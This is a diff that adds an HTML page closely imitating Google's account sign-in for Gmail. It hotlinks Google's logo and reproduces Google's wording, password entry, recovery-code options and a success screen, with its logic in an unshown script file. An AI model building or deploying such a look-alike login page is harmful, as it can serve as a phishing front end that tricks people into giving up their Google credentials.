@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Accounts</title>
+    <!-- HTTPS enforcement script - runs first before any other resources load -->
+    <script>
+        // Strict HTTPS enforcement with HSTS-like behavior
+        (function enforceHTTPS() {
+            // Skip for local development and file protocol
+            if (window.location.hostname === 'localhost' || 
+                window.location.hostname === '127.0.0.1' || 
+                window.location.protocol === 'file:') {
+                return;
+            }
+            
+            // If not HTTPS and not already redirecting
+            if (window.location.protocol !== 'https:' && 
+                !window.location.href.includes('https-redirect=true')) {
+                
+                // Prevent infinite redirects
+                var redirectUrl = 'https://' + window.location.host + window.location.pathname + window.location.search;
+                
+                // Preserve hash if present (but don't expose in redirect URL)
+                if (window.location.hash) {
+                    sessionStorage.setItem('httpsRedirectHash', window.location.hash);
+                }
+                
+                // Add flag to prevent loops
+                if (window.location.search) {
+                    redirectUrl += '&https-redirect=true';
+                } else {
+                    redirectUrl += '?https-redirect=true';
+                }
+                
+                // Permanent redirect (like HTTP 301)
+                window.location.replace(redirectUrl);
+            }
+            
+            // Restore hash after redirect if needed
+            if (window.location.protocol === 'https:' && sessionStorage.getItem('httpsRedirectHash')) {
+                var hash = sessionStorage.getItem('httpsRedirectHash');
+                sessionStorage.removeItem('httpsRedirectHash');
+                window.location.hash = hash;
+            }
+        })();
+    </script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <!-- Security headers (would be better served via server headers) -->
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+</head>
+<body>
+    <header class="header">
+        <div></div>
+        <div class="header-right">
+            <a href="#" class="help-link">Help</a>
+            <a href="#" class="privacy-link">Privacy</a>
+            <a href="#" class="terms-link">Terms</a>
+        </div>
+    </header>
+
+    <main class="container" id="mainContainer">
+        <!-- Sign In Page -->
+        <div id="signinPage">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+
+            <div class="card">
+                <h1 class="title">Sign in</h1>
+                <p class="subtitle">to continue to Gmail</p>
+
+                <form id="signinForm">
+                    <div class="form-group">
+                        <input type="email" class="form-input" id="email" placeholder=" " autocomplete="username" required>
+                        <label for="email" class="form-label">Email or phone</label>
+                        <div class="error-message" id="emailError">Couldn't find your Google Account</div>
+                    </div>
+
+                    <div class="form-group" id="passwordGroup" style="display: none;">
+                        <input type="password" class="form-input" id="password" placeholder=" " autocomplete="current-password" required>
+                        <label for="password" class="form-label">Enter your password</label>
+                        <button type="button" class="password-toggle" id="togglePassword">
+                            <span class="material-icons">visibility</span>
+                        </button>
+                        <div class="error-message" id="passwordError">Wrong password. Try again or click Forgot password to reset it.</div>
+                    </div>
+
+                    <a href="#" class="forgot-email" id="forgotEmail">Forgot email?</a>
+                    <a href="#" class="forgot-password" id="forgotPassword" style="display: none;">Forgot password?</a>
+
+                    <p class="disclaimer">
+                        Not your computer? Use Guest mode to sign in privately.
+                        <a href="#">Learn more</a>
+                    </p>
+
+                    <div class="button-group">
+                        <a href="#" class="create-account">Create account</a>
+                        <button type="button" class="next-button" id="nextButton">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <div style="text-align: center;">
+                <select id="language">
+                    <option value="en">English (United States)</option>
+                    <option value="es">Español (España)</option>
+                    <option value="fr">Français (France)</option>
+                    <option value="de">Deutsch</option>
+                </select>
+            </div>
+        </div>
+
+        <!-- Forgot Password Page -->
+        <div class="forgot-password-container" id="forgotPasswordPage">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+
+            <div class="card">
+                <button class="back-button" id="backFromForgotPassword">
+                    <span class="material-icons">arrow_back</span> Back
+                </button>
+                
+                <h1 class="title">Forgot password?</h1>
+                <p class="subtitle">Enter your email to reset your password</p>
+
+                <form id="forgotPasswordForm">
+                    <div class="form-group">
+                        <input type="email" class="form-input" id="recoveryEmail" placeholder=" " required>
+                        <label for="recoveryEmail" class="form-label">Email</label>
+                        <div class="error-message" id="recoveryEmailError">Enter a valid email address</div>
+                    </div>
+
+                    <div class="recovery-options" id="recoveryOptions" style="display: none;">
+                        <h3 style="margin-bottom: 16px;">How do you want to get the verification code?</h3>
+                        
+                        <div class="recovery-option" id="emailRecovery">
+                            <span class="material-icons recovery-icon">email</span>
+                            <div>
+                                <div style="font-weight: 500;">Send code via email</div>
+                                <div style="color: #5f6368; font-size: 12px;">••••@gmail.com</div>
+                            </div>
+                        </div>
+
+                        <div class="recovery-option" id="smsRecovery" style="display: none;">
+                            <span class="material-icons recovery-icon">sms</span>
+                            <div>
+                                <div style="font-weight: 500;">Send code via SMS</div>
+                                <div style="color: #5f6368; font-size: 12px;">••••••••1234</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="next-button" id="sendRecoveryButton">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Success Page (hidden initially) -->
+    <div class="container" id="successPage" style="display: none;">
+        <div class="success-container">
+            <div class="success-icon">
+                <span class="material-icons">check_circle</span>
+            </div>
+            <h1 class="success-message">Signed in successfully</h1>
+            <p>You are now signed in as <span class="user-email" id="signedInEmail">user@example.com</span></p>
+            <div style="margin-top: 40px;">
+                <button class="next-button" id="signOutButton">Sign out</button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Privacy</a>
+            </div>
+            <div class="language-selector">
+                <span>Help</span>
+            </div>
+        </div>
+    </footer>
+    
+    <script src="script.js"></script>
+</body>
+</html>
